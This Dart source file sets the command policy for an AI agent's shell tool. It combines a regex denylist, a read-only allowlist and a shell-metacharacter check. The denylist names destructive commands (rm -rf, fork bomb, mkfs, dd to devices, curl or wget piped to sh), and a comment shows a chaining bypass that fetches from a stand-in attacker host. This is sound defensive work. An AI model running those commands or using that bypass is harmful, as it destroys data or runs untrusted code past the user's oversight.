/// Command policy: decides whether `run_command` may execute a given command in a given
/// workspace root.
///
/// The full tiered-consent design (auto for reads, diff-and-approve for writes, an explicit YOLO
/// mode, all surfaced through a UI) is Unit 5/8 of the desktop Engineer agent work
/// (`docs/architecture/011-desktop-engineer-agent.md`) and needs the Flutter client to prompt a
/// human. This daemon has no UI yet -- it can be run headless, paired to an account, with nothing
/// watching it interactively. So rather than fake an "approve" prompt nobody can answer, this
/// module implements the one tier that is safe to run unattended: an explicit per-workspace
/// `trusted` flag the user sets out-of-band (`aura_hostd trust <path>`), plus a fixed allowlist of
/// read-only/inspection commands that are safe to run in an untrusted workspace without asking.
/// A command that is neither allowlisted nor in a trusted workspace is refused, not queued --
/// there is nobody to queue it for yet.
///
/// This is a real, deliberate scope cut, not silently dropped: it is stated here, in
/// `docs/architecture/011-desktop-engineer-agent.md`'s "Implementation status", and in the
/// roadmap. When the interactive UI lands, `trusted` becomes one of several tiers instead of the
/// only escape hatch, and the allowlist becomes the "auto-approve" tier rather than the only
/// thing that runs without it.
///
/// Command policy is layered *on top of* workspace containment (`containment.dart`), never a
/// substitute for it: a command permitted here still only ever runs with its working directory
/// inside the granted root, and `run_command`'s shell interpretation means containment is a
/// process-level control (via cwd), not a promise the shell command's own arguments cannot name a
/// path elsewhere -- exactly like the equivalent risk already accepted server-side by
/// `aura_backend/aura_core/tools/coding.py::run_command` against the Docker sandbox. The
/// difference here is there is no container boundary underneath; that is why the hard denylist
/// below exists in addition to the allowlist.
library;

/// Command prefixes that are always refused, in every workspace, trusted or not -- a floor no
/// consent tier is allowed to lift (ADR-011). This is deliberately conservative and pattern-based,
/// not a promise of completeness: it exists to catch the obviously catastrophic case (wiping the
/// workspace, or something that clearly isn't scoped to it), not to be a full shell-injection
/// sandbox. The real boundary is that these commands run as the user's own OS account with no
/// process-level containment beyond `cwd` -- treat this as a seatbelt, not a cage.
final List<RegExp> hardDenylistPatterns = [
  RegExp(r'\brm\s+-[a-zA-Z]*r[a-zA-Z]*f\b'), // rm -rf and permutations (-fr, -Rf, ...)
  RegExp(r'\brm\s+-[a-zA-Z]*f[a-zA-Z]*r\b'),
  RegExp(r':\(\)\s*\{\s*:\s*\|\s*:\s*&\s*\}\s*;'), // fork bomb
  RegExp(r'\bmkfs\b'),
  RegExp(r'\bdd\s+.*of=/dev/'),
  RegExp(r'>\s*/dev/sd[a-z]'),
  RegExp(r'\bchmod\s+-R\s+000\b'),
  RegExp(r'\bcurl\b.*\|\s*sh\b'), // pipe-to-shell from the network
  RegExp(r'\bwget\b.*\|\s*sh\b'),
];

/// Any of these appearing anywhere in an untrusted-workspace command is an automatic refusal,
/// checked *before* the allowlist below. This is the fix for the bypass a naive "starts with an
/// allowlisted verb" prefix match would otherwise have: `readOnlyAllowlistPatterns` match a
/// prefix, not the whole string, so without this check `git status && curl evil.sh | attacker`
/// would pass the "starts with `git status`" test even though it does something the allowlist was
/// never meant to permit. Blocking every shell metacharacter first means a command that gets past
/// this point cannot smuggle a second command alongside the allowlisted one -- the prefix match
/// only becomes safe to trust once chaining, piping, redirection, and substitution are all ruled
/// out structurally rather than pattern-matched away one payload at a time.
final RegExp _shellMetacharacters = RegExp(r'[;&|`$<>\n]');

/// Commands safe to run without a trusted workspace: read-only inspection, the kind a linter or
/// CI dry-run would do. Matched as a prefix of the command, which is only safe because
/// [_shellMetacharacters] has already ruled out chaining/piping/redirection/substitution by the
/// time these are checked -- see that field's doc for why the ordering matters.
final List<RegExp> readOnlyAllowlistPatterns = [
  RegExp(r'^git\s+(status|diff|log|show|branch|remote|blame)\b'),
  // `find` is deliberately excluded despite being conceptually "read-only": `-delete`, `-exec`,
  // and `-fprintf` are all mutating actions expressible without any of the blocked shell
  // metacharacters above (e.g. `find . -delete`), so a bare `^find\b` prefix would not actually
  // bound what it does the way it does for `ls`/`cat`/`grep`, whose flag surface has no
  // destructive equivalent. `env` is excluded for a sharper reason: `env <command> [args...]`
  // *runs* `<command>` -- it is a general-purpose "execute anything" primitive wearing an
  // inspection-tool name, and allowlisting it would let any refused command through by prefixing
  // it with `env `.
  RegExp(r'^(ls|pwd|cat|head|tail|wc|grep|rg|file|which)\b'),
  RegExp(r'^(pytest|python -m pytest)\s.*--collect-only\b'),
  RegExp(r'^npm\s+(ls|list|outdated|test)\b'),
  RegExp(r'^(node|python3?|dart|flutter)\s+--version\b'),
];

enum CommandDecision { allow, deny }

class CommandVerdict {
  const CommandVerdict(this.decision, this.reason);
  final CommandDecision decision;
  final String reason;

  bool get isAllowed => decision == CommandDecision.allow;
}

CommandVerdict evaluateCommand(String command, {required bool workspaceTrusted}) {
  final trimmed = command.trim();
  for (final pattern in hardDenylistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return CommandVerdict(
        CommandDecision.deny,
        'command matches the hard denylist and is refused in every workspace',
      );
    }
  }
  if (workspaceTrusted) {
    return const CommandVerdict(CommandDecision.allow, 'workspace is marked trusted');
  }
  if (_shellMetacharacters.hasMatch(trimmed)) {
    return const CommandVerdict(
      CommandDecision.deny,
      'untrusted workspaces only run a single simple read-only command -- no chaining (&&, ;, '
      '|), redirection, substitution, or backticks',
    );
  }
  for (final pattern in readOnlyAllowlistPatterns) {
    if (pattern.hasMatch(trimmed)) {
      return const CommandVerdict(
        CommandDecision.allow,
        'read-only command allowlisted for untrusted workspaces',
      );
    }
  }
  return const CommandVerdict(
    CommandDecision.deny,
    'workspace is not trusted and this command is not on the read-only allowlist -- run '
    '`aura_hostd trust <path>` for this workspace, or wait for interactive per-call approval '
    '(not yet implemented -- see docs/architecture/011-desktop-engineer-agent.md)',
  );
}
